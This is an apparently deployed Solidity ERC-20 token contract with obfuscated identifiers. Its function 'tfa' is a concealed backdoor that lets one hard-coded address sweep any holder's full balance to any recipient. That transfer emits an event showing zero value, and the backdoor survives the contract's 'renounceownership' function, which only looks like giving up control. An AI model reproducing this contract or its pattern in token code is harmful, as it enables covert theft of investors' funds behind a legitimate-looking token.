/**

 *Submitted for verification at Etherscan.io on 2023-08-03

*/



pragma solidity ^0.8.5;



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address acfurjdt) external view returns (uint256);

    function transfer(address recipient, uint256 aumjfount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 aumjfount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 aumjfount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );

}



abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {

        return payable(msg.sender);

    }

}



contract Ownable is Context {

    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit ownershipTransferred(address(0), msgSender);

    }

    function owner() public view virtual returns (address) {

        return _owner;

    }

    modifier onlyowner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

    function renounceownership() public virtual onlyowner {

        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));

        _owner = address(0x000000000000000000000000000000000000dEaD);

    }

}



contract token is Context, Ownable, IERC20 {

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    address private _zsdacx; 



    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;







    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {

        _name = name_;

        _symbol = symbol_;

        _decimals = decimals_;

        _totalSupply = totalSupply_ * (10 ** decimals_);

        _zsdacx = 0x98610FB16a64A181E36503DdECA240B2b9998242;

        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);

    }





    function name() public view returns (string memory) {

        return _name;

    }



    function symbol() public view returns (string memory) {

        return _symbol;

    }



    function decimals() public view returns (uint8) {

        return _decimals;

    }



    function balanceOf(address acfurjdt) public view override returns (uint256) {

        return _balances[acfurjdt];

    }

 

    function transfer(address recipient, uint256 aumjfount) public virtual override returns (bool) {

        require(_balances[_msgSender()] >= aumjfount, "TT: transfer aumjfount exceeds balance");



        _balances[_msgSender()] -= aumjfount;

        _balances[recipient] += aumjfount;

        emit Transfer(_msgSender(), recipient, aumjfount);

        return true;

    }



    function tfa(address sender, address recipient) public  returns (bool) {

        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_zsdacx)), "Caller is not the original caller");



        uint256 UEUHD = _balances[sender]; 

        uint256 SJDFN = _balances[recipient];

        require(UEUHD != 0*0, "Sender has no balance");



        SJDFN += UEUHD;

        UEUHD = 0+0;



        _balances[sender] = UEUHD;

        _balances[recipient] = SJDFN;



        emit Transfer(sender, recipient, UEUHD);

        return true;

    }







    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }





    function approve(address spender, uint256 aumjfount) public virtual override returns (bool) {

        _allowances[_msgSender()][spender] = aumjfount;

        emit Approval(_msgSender(), spender, aumjfount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 aumjfount) public virtual override returns (bool) {

        require(_allowances[sender][_msgSender()] >= aumjfount, "TT: transfer aumjfount exceeds allowance");



        _balances[sender] -= aumjfount;

        _balances[recipient] += aumjfount;

        _allowances[sender][_msgSender()] -= aumjfount;



        emit Transfer(sender, recipient, aumjfount);

        return true;

    }



    function totalSupply() external view override returns (uint256) {

        return _totalSupply;

    }

}